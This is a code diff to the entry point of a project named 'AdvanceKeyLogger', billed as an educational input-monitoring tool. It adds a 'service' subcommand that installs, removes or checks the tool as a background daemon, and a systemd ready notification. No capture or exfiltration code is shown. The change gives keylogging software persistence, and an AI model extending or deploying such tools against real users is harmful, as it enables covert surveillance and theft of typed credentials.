@@ -36,6 +36,7 @@ from profiler import AppCategorizer, AppUsageTracker, ProductivityScorer
 from storage.manager import StorageManager
 from storage.sqlite_storage import SQLiteStorage
 from transport import create_transport, list_transports
+from service import ServiceManager
 from utils.compression import gzip_data
 from utils.crypto import encrypt, generate_key, key_from_base64, key_to_base64
 from utils.logger_setup import setup_logging
@@ -58,6 +59,13 @@ def parse_args() -> argparse.Namespace:
             "Educational input monitoring tool for learning"
             " OS APIs and software architecture."
         ),
+    )
+    subparsers = parser.add_subparsers(dest="command")
+    service_parser = subparsers.add_parser("service", help="Manage service/daemon mode")
+    service_parser.add_argument(
+        "action",
+        choices=["install", "uninstall", "status"],
+        help="Service action to perform",
     )
     parser.add_argument(
         "-c", "--config",
@@ -302,6 +310,20 @@ def main() -> int:
 
     logger.info("AdvanceKeyLogger starting...")
 
+    # --- Service management ---
+    if args.command == "service":
+        manager = ServiceManager(settings.as_dict())
+        action = getattr(args, "action", "")
+        if action == "install":
+            print(manager.install())
+        elif action == "uninstall":
+            print(manager.uninstall())
+        elif action == "status":
+            print(manager.status())
+        else:
+            print("Unknown service action")
+        return 0
+
     # --- List plugins and exit ---
     if args.list_captures:
         captures = list_captures()
@@ -449,6 +471,14 @@ def main() -> int:
             logger.info("Started: %s", cap)
         except Exception as e:
             logger.error("Failed to start %s: %s", cap, e)
+
+    # Notify systemd if applicable.
+    try:
+        from service.linux_systemd import sd_notify
+
+        sd_notify("READY=1")
+    except Exception:
+        pass
 
     # --- Main loop ---
     report_interval = settings.get("general.report_interval", 30)
